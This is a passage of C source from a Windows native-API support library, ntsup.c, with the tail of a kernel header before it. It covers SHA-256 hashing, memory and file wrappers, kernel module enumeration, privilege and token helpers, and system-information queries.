#define RTL_VRF_FLG_MISCELLANEOUS_CHECKS             0x00020000
#define RTL_VRF_FLG_LOCK_CHECKS                      0x00040000

NTSYSAPI
VOID
NTAPI
RtlApplicationVerifierStop(
    _In_ ULONG_PTR Code,
    _In_ PSTR Message,
    _In_ ULONG_PTR Param1,
    _In_ PSTR Description1,
    _In_ ULONG_PTR Param2,
    _In_ PSTR Description2,
    _In_ ULONG_PTR Param3,
    _In_ PSTR Description3,
    _In_ ULONG_PTR Param4,
    _In_ PSTR Description4);

#ifndef VERIFIER_STOP
#define VERIFIER_STOP(Code, Msg, P1, S1, P2, S2, P3, S3, P4, S4) {  \
        RtlApplicationVerifierStop ((Code),                         \
                                    (Msg),                          \
                                    (ULONG_PTR)(P1),(S1),           \
                                    (ULONG_PTR)(P2),(S2),           \
                                    (ULONG_PTR)(P3),(S3),           \
                                    (ULONG_PTR)(P4),(S4));          \
  }
#endif

/************************************************************************************
*
* CPU partition API & definitions.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtOpenCpuPartition(
    _Out_ PHANDLE CpuPartitionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateCpuPartition(
    _Out_ PHANDLE CpuPartitionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationCpuPartition(
    _In_ HANDLE CpuPartitionHandle,
    _In_ ULONG CpuPartitionInformationClass,
    _In_reads_bytes_(CpuPartitionInformationLength) PVOID CpuPartitionInformation,
    _In_ ULONG CpuPartitionInformationLength,
    _Reserved_ PVOID Reserved0,
    _Reserved_ ULONG Reserved1,
    _Reserved_ ULONG Reserved2);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationCpuPartition(
    _In_ HANDLE CpuPartitionHandle,
    _In_ ULONG CpuPartitionInformationClass,
    _Out_writes_bytes_opt_(CpuPartitionInformationLength) PVOID CpuPartitionInformation,
    _In_ ULONG CpuPartitionInformationLength,
    _Out_opt_ PULONG ReturnLength);

//
// NTOS_RTL HEADER END
//

#ifdef __cplusplus
}
#endif

#pragma warning(pop)

#endif NTOS_RTL

```

`Source/Shared/ntos/ntsup.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2011 - 2025 UGN/HE
*
*  TITLE:       NTSUP.C
*
*  VERSION:     2.25
*
*  DATE:        18 Aug 2025
*
*  Native API support functions.
*
*  Only ntdll-bound import.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "ntsup.h"

#pragma warning(push)
#pragma warning(disable: 26812) // Prefer 'enum class' over 'enum'
#pragma warning(disable: 6320) // exception may mask

/*
* 
* SHA256 algo (used by Ronova so keep it here).
* 
*/

typedef struct _NTSUP_SHA256_CTX {
    ULONG State[8];
    ULONG64 BitCount;
    UCHAR Buffer[64];
} NTSUP_SHA256_CTX, * PNTSUP_SHA256_CTX;

#define NTSUP_ROTR32(v,b) _rotr(v,b)
#define NTSUP_CH(x,y,z)   (((x) & (y)) ^ ((~x) & (z)))
#define NTSUP_MAJ(x,y,z)  (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define NTSUP_BSIG0(x)    (NTSUP_ROTR32(x,2) ^ NTSUP_ROTR32(x,13) ^ NTSUP_ROTR32(x,22))
#define NTSUP_BSIG1(x)    (NTSUP_ROTR32(x,6) ^ NTSUP_ROTR32(x,11) ^ NTSUP_ROTR32(x,25))
#define NTSUP_SSIG0(x)    (NTSUP_ROTR32(x,7) ^ NTSUP_ROTR32(x,18) ^ ((x) >> 3))
#define NTSUP_SSIG1(x)    (NTSUP_ROTR32(x,17) ^ NTSUP_ROTR32(x,19) ^ ((x) >> 10))

static const ULONG ntsupSha256K[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,
    0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
    0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,
    0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,
    0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
    0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,
    0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,
    0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
    0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

VOID ntsupSha256Transform(
    _Inout_ PNTSUP_SHA256_CTX Ctx,
    _In_reads_bytes_(64) const UCHAR Block[64]
)
{
    ULONG W[64];
    ULONG a, b, c, d, e, f, g, h, t1, t2;
    ULONG i;
    for (i = 0; i < 16; i++) {
        W[i] = (Block[i * 4] << 24) |
            (Block[i * 4 + 1] << 16) |
            (Block[i * 4 + 2] << 8) |
            (Block[i * 4 + 3]);
    }
    for (i = 16; i < 64; i++) {
        W[i] = NTSUP_SSIG1(W[i - 2]) + W[i - 7] + NTSUP_SSIG0(W[i - 15]) + W[i - 16];
    }

    a = Ctx->State[0];
    b = Ctx->State[1];
    c = Ctx->State[2];
    d = Ctx->State[3];
    e = Ctx->State[4];
    f = Ctx->State[5];
    g = Ctx->State[6];
    h = Ctx->State[7];

    for (i = 0; i < 64; i++) {
        t1 = h + NTSUP_BSIG1(e) + NTSUP_CH(e, f, g) + ntsupSha256K[i] + W[i];
        t2 = NTSUP_BSIG0(a) + NTSUP_MAJ(a, b, c);
        h = g;
        g = f;
        f = e;
        e = d + t1;
        d = c;
        c = b;
        b = a;
        a = t1 + t2;
    }

    Ctx->State[0] += a;
    Ctx->State[1] += b;
    Ctx->State[2] += c;
    Ctx->State[3] += d;
    Ctx->State[4] += e;
    Ctx->State[5] += f;
    Ctx->State[6] += g;
    Ctx->State[7] += h;

    RtlSecureZeroMemory(W, sizeof(W));
}

VOID ntsupSha256Init(
    _Out_ PNTSUP_SHA256_CTX Ctx
)
{
    RtlSecureZeroMemory(Ctx, sizeof(NTSUP_SHA256_CTX));
    Ctx->State[0] = 0x6A09E667;
    Ctx->State[1] = 0xBB67AE85;
    Ctx->State[2] = 0x3C6EF372;
    Ctx->State[3] = 0xA54FF53A;
    Ctx->State[4] = 0x510E527F;
    Ctx->State[5] = 0x9B05688C;
    Ctx->State[6] = 0x1F83D9AB;
    Ctx->State[7] = 0x5BE0CD19;
}

VOID ntsupSha256Update(
    _Inout_ PNTSUP_SHA256_CTX Ctx,
    _In_reads_bytes_(Length) const UCHAR* Data,
    _In_ SIZE_T Length
)
{
    SIZE_T have, need;
    SIZE_T off;
    const UCHAR* p;

    if (Length == 0) return;

    have = (SIZE_T)((Ctx->BitCount >> 3) & 0x3F);
    need = 64 - have;
    Ctx->BitCount += (ULONG64)Length * 8;
    p = Data;
    off = 0;

    if (have && Length >= need) {
        RtlCopyMemory(Ctx->Buffer + have, p, need);
        ntsupSha256Transform(Ctx, Ctx->Buffer);
        off += need;
        have = 0;
    }

    while (off + 64 <= Length) {
#pragma warning(push)
#pragma warning(disable: 6385)
        ntsupSha256Transform(Ctx, p + off);
#pragma warning(pop)
        off += 64;
    }

    if (off < Length) {
        RtlCopyMemory(Ctx->Buffer + have, p + off, Length - off);
    }
}

VOID ntsupSha256Final(
    _Inout_ PNTSUP_SHA256_CTX Ctx,
    _Out_writes_bytes_all_(32) UCHAR Digest[32]
)
{
    UCHAR pad[64];
    UCHAR len[8];
    SIZE_T padLen;
    SIZE_T i;
    ULONG64 bitCount;

    bitCount = Ctx->BitCount;

    for (i = 0; i < 8; i++) {
        len[7 - i] = (UCHAR)(bitCount >> (i * 8));
    }

    pad[0] = 0x80;
    RtlSecureZeroMemory(pad + 1, 63);

    padLen = 64 - ((bitCount >> 3) & 0x3f);
    if (padLen < 9) padLen += 64;

    ntsupSha256Update(Ctx, pad, padLen - 8);
    ntsupSha256Update(Ctx, len, 8);

    for (i = 0; i < 8; i++) {
        Digest[i * 4 + 0] = (UCHAR)(Ctx->State[i] >> 24);
        Digest[i * 4 + 1] = (UCHAR)(Ctx->State[i] >> 16);
        Digest[i * 4 + 2] = (UCHAR)(Ctx->State[i] >> 8);
        Digest[i * 4 + 3] = (UCHAR)(Ctx->State[i]);
    }

    RtlSecureZeroMemory(Ctx, sizeof(NTSUP_SHA256_CTX));
    RtlSecureZeroMemory(pad, sizeof(pad));
    RtlSecureZeroMemory(len, sizeof(len));
}

/*
* ntsupHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap with process heap.
*
*/
PVOID ntsupHeapAlloc(
    _In_ SIZE_T Size
)
{
    return RtlAllocateHeap(ntsupProcessHeap(), HEAP_ZERO_MEMORY, Size);
}

/*
* ntsupHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap with process heap.
*
*/
VOID ntsupHeapFree(
    _In_ PVOID BaseAddress
)
{
    RtlFreeHeap(ntsupProcessHeap(), 0, BaseAddress);
}

/*
* ntsupVirtualAllocEx
*
* Purpose:
*
* Wrapper for ntsupVirtualAllocEx with standard parameters.
*
*/
PVOID ntsupVirtualAllocEx(
    _In_ SIZE_T Size,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect)
{
    NTSTATUS ntStatus;
    PVOID bufferPtr = NULL;
    SIZE_T bufferSize;

    bufferSize = Size;
    ntStatus = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &bufferPtr,
        0,
        &bufferSize,
        AllocationType,
        Protect);

    if (NT_SUCCESS(ntStatus)) {
        return bufferPtr;
    }

    RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
    return NULL;
}

/*
* ntsupVirtualAlloc
*
* Purpose:
*
* Wrapper for supVirtualAllocEx.
*
*/
PVOID ntsupVirtualAlloc(
    _In_ SIZE_T Size)
{
    return ntsupVirtualAllocEx(Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

/*
* ntsupVirtualLock
*
* Purpose:
*
* Wrapper for NtLockVirtualMemory.
*
*/
BOOL ntsupVirtualLock(
    _In_ LPVOID lpAddress,
    _In_ SIZE_T dwSize
)
{
    return (NT_SUCCESS(NtLockVirtualMemory(NtCurrentProcess(),
        &lpAddress,
        &dwSize,
        MAP_PROCESS)));
}

/*
* ntsupVirtualUnlock
*
* Purpose:
*
* Wrapper for NtUnlockVirtualMemory.
*
*/
BOOL ntsupVirtualUnlock(
    _In_ LPVOID lpAddress,
    _In_ SIZE_T dwSize
)
{
    return (NT_SUCCESS(NtUnlockVirtualMemory(NtCurrentProcess(),
        &lpAddress,
        &dwSize,
        MAP_PROCESS)));
}

/*
* ntsupVirtualFree
*
* Purpose:
*
* Wrapper for NtFreeVirtualMemory.
*
*/
BOOL ntsupVirtualFree(
    _In_ PVOID Memory)
{
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    SIZE_T sizeDummy = 0;

    if (Memory) {
        ntStatus = NtFreeVirtualMemory(
            NtCurrentProcess(),
            &Memory,
            &sizeDummy,
            MEM_RELEASE);
    }
    else {
        RtlSetLastWin32Error(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
    return NT_SUCCESS(ntStatus);
}

/*
* ntsupWriteBufferToFile
*
* Purpose:
*
* Create new file (or open existing) and write buffer to it.
*
*/
SIZE_T ntsupWriteBufferToFile(
    _In_ PCWSTR FileName,
    _In_ PVOID Buffer,
    _In_ SIZE_T Size,
    _In_ BOOL Flush,
    _In_ BOOL Append,
    _Out_opt_ NTSTATUS* Result
)
{
    NTSTATUS           ntStatus = STATUS_UNSUCCESSFUL;
    ACCESS_MASK        desiredAccess = FILE_WRITE_DATA | SYNCHRONIZE;
    DWORD              dwFlag = FILE_OVERWRITE_IF;
    ULONG              blockSize, remainingSize;
    HANDLE             hFile = NULL;
    ULONG_PTR          nBlocks, blockIndex;
    SIZE_T             bytesWritten = 0;
    PBYTE              ptr = (PBYTE)Buffer;
    LARGE_INTEGER      filePosition;
    PLARGE_INTEGER     pPosition = NULL;
    OBJECT_ATTRIBUTES  attr;
    UNICODE_STRING     ntFileName;
    IO_STATUS_BLOCK    ioStatus;

    if (Result)
        *Result = STATUS_UNSUCCESSFUL;

    if (RtlDosPathNameToNtPathName_U(FileName, &ntFileName, NULL, NULL) == FALSE) {
        if (Result)
            *Result = STATUS_INVALID_PARAMETER_1;
        return 0;
    }

    if (Append) {
        desiredAccess |= FILE_READ_DATA | FILE_APPEND_DATA;
        dwFlag = FILE_OPEN_IF;
    }

    InitializeObjectAttributes(&attr, &ntFileName, OBJ_CASE_INSENSITIVE, 0, NULL);

    __try {
        ntStatus = NtCreateFile(&hFile, desiredAccess, &attr,
            &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0, dwFlag,
            FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);

        if (!NT_SUCCESS(ntStatus))
            __leave;

        if (Append) {
            filePosition.LowPart = FILE_WRITE_TO_END_OF_FILE;
            filePosition.HighPart = -1;
            pPosition = &filePosition;
        }

        if (Size < 0x80000000) {
            blockSize = (ULONG)Size;
            ntStatus = NtWriteFile(hFile, 0, NULL, NULL, &ioStatus, ptr, blockSize, pPosition, NULL);
            if (!NT_SUCCESS(ntStatus))
                __leave;

            bytesWritten += ioStatus.Information;
            if (Append)
                pPosition = NULL;
        }
        else {
            blockSize = MAX_NTSUP_WRITE_CHUNK;
            nBlocks = (Size / blockSize);
            for (blockIndex = 0; blockIndex < nBlocks; blockIndex++) {

                ntStatus = NtWriteFile(hFile, 0, NULL, NULL, &ioStatus, ptr, blockSize, pPosition, NULL);
                if (!NT_SUCCESS(ntStatus))
                    __leave;

                ptr += blockSize;
                bytesWritten += ioStatus.Information;
                if (Append && blockIndex == 0)
                    pPosition = NULL;
            }
            remainingSize = (ULONG)(Size % blockSize);
            if (remainingSize) {
                ntStatus = NtWriteFile(hFile, 0, NULL, NULL, &ioStatus, ptr, remainingSize, pPosition, NULL);
                if (!NT_SUCCESS(ntStatus))
                    __leave;
                bytesWritten += ioStatus.Information;
            }
        }
    }
    __finally {
        if (hFile) {

            if (Flush)
                NtFlushBuffersFile(hFile, &ioStatus);

            NtClose(hFile);
        }
        RtlFreeUnicodeString(&ntFileName);
        if (Result) *Result = ntStatus;
    }
    return bytesWritten;
}

/*
* ntsupFindModuleEntryByName
*
* Purpose:
*
* Find Module entry for given name.
*
*/
PVOID ntsupFindModuleEntryByName(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ LPCSTR ModuleName
)
{
    ULONG i, modulesCount = ModulesList->NumberOfModules, fnameOffset;
    LPSTR entryName;
    PRTL_PROCESS_MODULE_INFORMATION moduleEntry;

    for (i = 0; i < modulesCount; i++) {

        moduleEntry = &ModulesList->Modules[i];
        fnameOffset = moduleEntry->OffsetToFileName;
        entryName = (LPSTR)&moduleEntry->FullPathName[fnameOffset];
        if (_strcmpi_a(entryName, ModuleName) == 0)
            return moduleEntry;
    }

    return NULL;
}

/*
* ntsupFindModuleEntryByName_U
*
* Purpose:
*
* Find Module entry for given name.
*
*/
PVOID ntsupFindModuleEntryByName_U(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ LPCWSTR ModuleName
)
{
    ULONG i, modulesCount = ModulesList->NumberOfModules, fnameOffset;
    LPSTR entryName;
    PRTL_PROCESS_MODULE_INFORMATION moduleEntry, result = NULL;

    UNICODE_STRING usString;
    ANSI_STRING moduleName;

    if (NT_SUCCESS(RtlInitUnicodeStringEx(&usString, ModuleName))) {
        moduleName.Buffer = NULL;
        moduleName.Length = moduleName.MaximumLength = 0;
        if (NT_SUCCESS(RtlUnicodeStringToAnsiString(&moduleName, &usString, TRUE))) {

            for (i = 0; i < modulesCount; i++) {

                moduleEntry = &ModulesList->Modules[i];
                fnameOffset = moduleEntry->OffsetToFileName;
                entryName = (LPSTR)&moduleEntry->FullPathName[fnameOffset];
                if (_strcmpi_a(entryName, moduleName.Buffer) == 0) {
                    result = moduleEntry;
                    break;
                }
            }

            RtlFreeAnsiString(&moduleName);
        }
    }
    return result;
}

/*
* ntsupFindModuleEntryByAddress
*
* Purpose:
*
* Find Module Name for given Address and copy it to the supplied buffer.
*
* Returns module entry if found, NULL otherwise.
*
*/
BOOL ntsupFindModuleEntryByAddress(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ PVOID Address,
    _Out_ PULONG ModuleIndex
)
{
    ULONG i, modulesCount = ModulesList->NumberOfModules;

    *ModuleIndex = 0;

    for (i = 0; i < modulesCount; i++) {
        if (IN_REGION(Address,
            ModulesList->Modules[i].ImageBase,
            ModulesList->Modules[i].ImageSize))
        {
            *ModuleIndex = i;
            return TRUE;
        }
    }
    return FALSE;
}

/*
* ntsupGetModuleEntryByAddress
*
* Purpose:
*
* Get Module Entry for given Address.
*
*/
PVOID ntsupGetModuleEntryByAddress(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ PVOID Address
)
{
    ULONG i, modulesCount = ModulesList->NumberOfModules;

    for (i = 0; i < modulesCount; i++) {
        if (IN_REGION(Address,
            ModulesList->Modules[i].ImageBase,
            ModulesList->Modules[i].ImageSize))
        {           
            return &ModulesList->Modules[i];
        }
    }
    return NULL;
}

/*
* ntsupFindModuleNameByAddress
*
* Purpose:
*
* Find Module Name for given Address.
*
*/
PVOID ntsupFindModuleNameByAddress(
    _In_ PRTL_PROCESS_MODULES ModulesList,
    _In_ PVOID Address,
    _Inout_	LPWSTR Buffer,
    _In_ DWORD ccBuffer //size of buffer in chars
)
{
    ULONG i, modulesCount;
    NTSTATUS ntStatus;
    SIZE_T copyLength;
    UNICODE_STRING usConvertedName;
    PRTL_PROCESS_MODULE_INFORMATION moduleEntry;

    if ((Buffer == NULL) || (ccBuffer == 0)) {
        return NULL;
    }

    modulesCount = ModulesList->NumberOfModules;

    for (i = 0; i < modulesCount; i++) {
        if (IN_REGION(Address,
            ModulesList->Modules[i].ImageBase,
            ModulesList->Modules[i].ImageSize))
        {
            moduleEntry = &ModulesList->Modules[i];

            RtlInitEmptyUnicodeString(&usConvertedName, NULL, 0);
            ntStatus = ntsupConvertToUnicode(
                (LPSTR)&moduleEntry->FullPathName[moduleEntry->OffsetToFileName],
                &usConvertedName);

            if (NT_SUCCESS(ntStatus)) {

                copyLength = usConvertedName.Length / sizeof(WCHAR);
                if (copyLength > (SIZE_T)(ccBuffer - 1))
                    copyLength = ccBuffer - 1;

                _strncpy(
                    Buffer,
                    ccBuffer,
                    usConvertedName.Buffer,
                    copyLength);

                RtlFreeUnicodeString(&usConvertedName);

                return &ModulesList->Modules[i];
            }
            else {
                return NULL;
            }
        }
    }
    return NULL;
}

/*
* ntsupConvertToUnicode
*
* Purpose:
*
* Convert ANSI string to UNICODE string.
*
* N.B.
* If function succeeded - use RtlFreeUnicodeString to release allocated string.
*
*/
NTSTATUS ntsupConvertToUnicode(
    _In_ LPCSTR AnsiString,
    _Inout_ PUNICODE_STRING UnicodeString)
{
    ANSI_STRING ansiString;

    RtlInitString(&ansiString, AnsiString);
    return RtlAnsiStringToUnicodeString(UnicodeString, &ansiString, TRUE);
}

/*
* ntsupConvertToAnsi
*
* Purpose:
*
* Convert UNICODE string to ANSI string.
*
* N.B.
* If function succeeded - use RtlFreeAnsiString to release allocated string.
*
*/
NTSTATUS ntsupConvertToAnsi(
    _In_ LPCWSTR UnicodeString,
    _Inout_ PANSI_STRING AnsiString)
{
    UNICODE_STRING unicodeString;

    RtlInitUnicodeString(&unicodeString, UnicodeString);
    return RtlUnicodeStringToAnsiString(AnsiString, &unicodeString, TRUE);
}

/*
* ntsupEnablePrivilege
*
* Purpose:
*
* Enable/Disable given privilege.
*
* Return FALSE on any error.
*
*/
BOOLEAN ntsupEnablePrivilege(
    _In_ DWORD Privilege,
    _In_ BOOLEAN Enable
)
{
    ULONG returnLength;
    NTSTATUS ntStatus;
    HANDLE tokenHandle;

    PTOKEN_PRIVILEGES newState;
    UCHAR rawBuffer[sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES)];

    ntStatus = NtOpenProcessToken(
        NtCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &tokenHandle);

    if (NT_SUCCESS(ntStatus)) {

        newState = (PTOKEN_PRIVILEGES)rawBuffer;

        newState->PrivilegeCount = 1;
        newState->Privileges[0].Luid = RtlConvertUlongToLuid(Privilege);
        newState->Privileges[0].Attributes = Enable ? SE_PRIVILEGE_ENABLED : 0;

        ntStatus = NtAdjustPrivilegesToken(
            tokenHandle,
            FALSE,
            newState,
            sizeof(rawBuffer),
            NULL,
            &returnLength);

        if (ntStatus == STATUS_NOT_ALL_ASSIGNED) {
            ntStatus = STATUS_PRIVILEGE_NOT_HELD;
        }

        NtClose(tokenHandle);

    }

    RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
    return NT_SUCCESS(ntStatus);
}

/*
* ntsupGetCurrentProcessToken
*
* Purpose:
*
* Return current process token value with TOKEN_QUERY access right.
*
*/
HANDLE ntsupGetCurrentProcessToken(
    VOID)
{
    HANDLE tokenHandle = NULL;

    if (NT_SUCCESS(NtOpenProcessToken(
        NtCurrentProcess(),
        TOKEN_QUERY,
        &tokenHandle)))
    {
        return tokenHandle;
    }
    return NULL;
}

/*
* ntsupQuerySystemRangeStart
*
* Purpose:
*
* Return MmSystemRangeStart value.
*
*/
ULONG_PTR ntsupQuerySystemRangeStart(
    VOID
)
{
    NTSTATUS  ntStatus;
    ULONG_PTR systemRangeStart = 0;
    ULONG     memIO = 0;

    ntStatus = NtQuerySystemInformation(
        SystemRangeStartInformation,
        (PVOID)&systemRangeStart,
        sizeof(ULONG_PTR),
        &memIO);

    if (!NT_SUCCESS(ntStatus)) {
        RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
    }
    return systemRangeStart;
}

/*
* ntsupQueryUserModeAccessibleRange
*
* Purpose:
*
* Return user mode applications accessible address range.
*
*/
BOOLEAN ntsupQueryUserModeAccessibleRange(
    _Out_ PULONG_PTR MinimumUserModeAddress,
    _Out_ PULONG_PTR MaximumUserModeAddress
)
{
    NTSTATUS  ntStatus;
    ULONG     memIO = 0;
    SYSTEM_BASIC_INFORMATION sysBasicInfo;

    RtlSecureZeroMemory(&sysBasicInfo, sizeof(sysBasicInfo));

    ntStatus = NtQuerySystemInformation(
        SystemBasicInformation,
        (PVOID)&sysBasicInfo,
        sizeof(sysBasicInfo),
        &memIO);

    if (NT_SUCCESS(ntStatus)) {

        *MinimumUserModeAddress = sysBasicInfo.MinimumUserModeAddress;
        *MaximumUserModeAddress = sysBasicInfo.MaximumUserModeAddress;

        return TRUE;
    }
    else {

        *MinimumUserModeAddress = 0;
        *MaximumUserModeAddress = 0;

    }

    return FALSE;
}

/*
* ntsupIsKdEnabled
*
* Purpose:
*
* Perform check if the kernel debugger active.
*
*/
BOOLEAN ntsupIsKdEnabled(
    _Out_opt_ PBOOLEAN DebuggerAllowed,
    _Out_opt_ PBOOLEAN DebuggerNotPresent
)
{
    BOOLEAN bResult = FALSE;
    NTSTATUS ntStatus;
    ULONG returnLength = 0;
    SYSTEM_KERNEL_DEBUGGER_INFORMATION kdInfo;
    SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX kdInfoEx;

    if (DebuggerAllowed)
        *DebuggerAllowed = FALSE;
    if (DebuggerNotPresent)
        *DebuggerNotPresent = FALSE;

    RtlSecureZeroMemory(&kdInfo, sizeof(kdInfo));

    ntStatus = NtQuerySystemInformation(
        SystemKernelDebuggerInformation,
        &kdInfo,
        sizeof(kdInfo),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {

        if (DebuggerNotPresent)
            *DebuggerNotPresent = kdInfo.KernelDebuggerNotPresent;

        bResult = kdInfo.KernelDebuggerEnabled;
    }
    else {
        RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
        return FALSE;
    }

    if (DebuggerAllowed) {

        RtlSecureZeroMemory(&kdInfoEx, sizeof(kdInfoEx));

        ntStatus = NtQuerySystemInformation(
            SystemKernelDebuggerInformationEx,
            &kdInfoEx,
            sizeof(kdInfoEx),
            &returnLength);

        if (NT_SUCCESS(ntStatus)) {
            *DebuggerAllowed = kdInfoEx.DebuggerAllowed;
        }
        else {
            *DebuggerAllowed = FALSE;
            RtlSetLastWin32Error(RtlNtStatusToDosError(ntStatus));
        }

    }

    return bResult;
}

/*
* ntsupIsProcess32bit
*
* Purpose:
*
* Return TRUE if process is wow64.
*
*/
BOOL ntsupIsProcess32bit(
    _In_ HANDLE hProcess
)
{
    ULONG                              returnLength;
    PROCESS_EXTENDED_BASIC_INFORMATION pebi;

    RtlSecureZeroMemory(&pebi, sizeof(pebi));
    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);

    if (NT_SUCCESS(NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pebi,
        sizeof(pebi),
        &returnLength)))
    {
        return (pebi.IsWow64Process == 1);
    }

    return FALSE;
}

/*
* ntsupGetLoadedModulesListEx
*
* Purpose:
*
* Read list of loaded kernel modules.
*
*/
PVOID ntsupGetLoadedModulesListEx(
    _In_ BOOL ExtendedOutput,
    _Out_opt_ PULONG ReturnLength,
    _In_ PNTSUPMEMALLOC AllocMem,
    _In_ PNTSUPMEMFREE FreeMem
)
{
    NTSTATUS    ntStatus;
    PVOID       buffer;
    ULONG       bufferSize = PAGE_SIZE;

    PRTL_PROCESS_MODULES pvModules;
    SYSTEM_INFORMATION_CLASS infoClass;

    if (ReturnLength)
        *ReturnLength = 0;

    infoClass = ExtendedOutput ? SystemModuleInformationEx : SystemModuleInformation;

    buffer = AllocMem((SIZE_T)bufferSize);
    if (buffer == NULL)
        return NULL;

    ntStatus = NtQuerySystemInformation(
        infoClass,
        buffer,
        bufferSize,
        &bufferSize);

    if (ntStatus == STATUS_INFO_LENGTH_MISMATCH) {

        FreeMem(buffer);
        if (bufferSize == 0 || bufferSize > MAX_NTSUP_BUFFER_SIZE)
            return NULL;

        buffer = AllocMem((SIZE_T)bufferSize);
        if (buffer == NULL)
            return NULL;

        ntStatus = NtQuerySystemInformation(
            infoClass,
            buffer,
            bufferSize,
            &bufferSize);
    }

    if (ReturnLength)
        *ReturnLength = bufferSize;

    //
    // Handle special case:
    // If driver image path exceeds structure field size, 
    // RtlUnicodeStringToAnsiString will throw STATUS_BUFFER_OVERFLOW.
    // If this is the last driver in enumeration, service will return 
    // valid data but with STATUS_BUFFER_OVERFLOW result.
    //
    if (ntStatus == STATUS_BUFFER_OVERFLOW) {

        //
        // Force ignore this status if list is not empty.
        //
        pvModules = (PRTL_PROCESS_MODULES)buffer;
        if (pvModules->NumberOfModules != 0)
            return buffer;
    }

    if (NT_SUCCESS(ntStatus)) {
        return buffer;
    }

    FreeMem(buffer);
    return NULL;
}

/*
* ntsupGetLoadedModulesList
*
* Purpose:
*
* Read list of loaded kernel modules.
*
* Returned buffer must be freed with ntsupHeapFree after usage.
*
*/
PVOID ntsupGetLoadedModulesList(
    _Out_opt_ PULONG ReturnLength
)
{
    return ntsupGetLoadedModulesListEx(
        FALSE,
        ReturnLength,
        (PNTSUPMEMALLOC)ntsupHeapAlloc,
        (PNTSUPMEMFREE)ntsupHeapFree);
}

/*
* ntsupGetLoadedModulesList2
*
* Purpose:
*
* Read list of loaded kernel modules.
*
* Returned buffer must be freed with ntsupHeapFree after usage.
*
*/
PVOID ntsupGetLoadedModulesList2(
    _Out_opt_ PULONG ReturnLength
)
{
    return ntsupGetLoadedModulesListEx(
        TRUE,
        ReturnLength,
        (PNTSUPMEMALLOC)ntsupHeapAlloc,
        (PNTSUPMEMFREE)ntsupHeapFree);
}

/*
* ntsupGetSystemInfoEx
*
* Purpose:
*
* Returns buffer with system information by given SystemInformationClass.
*
* Returned buffer must be freed with FreeMem function after usage.
*
*/
PVOID ntsupGetSystemInfoEx(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
    _Out_opt_ PULONG ReturnLength,
    _In_ PNTSUPMEMALLOC AllocMem,
    _In_ PNTSUPMEMFREE FreeMem
)
{
    PVOID       buffer = NULL;
    ULONG       bufferSize = PAGE_SIZE;
    NTSTATUS    ntStatus;
    ULONG       returnedLength = 0;

    if (ReturnLength)
        *ReturnLength = 0;

    buffer = AllocMem((SIZE_T)bufferSize);
    if (buffer == NULL)
        return NULL;

    while ((ntStatus = NtQuerySystemInformation(
        SystemInformationClass,
        buffer,
        bufferSize,
        &returnedLength)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        FreeMem(buffer);
        bufferSize <<= 1;

        if (bufferSize > MAX_NTSUP_BUFFER_SIZE)
            return NULL;

        buffer = AllocMem((SIZE_T)bufferSize);
        if (buffer == NULL)
            return NULL;
    }

    if (ReturnLength)
        *ReturnLength = returnedLength;

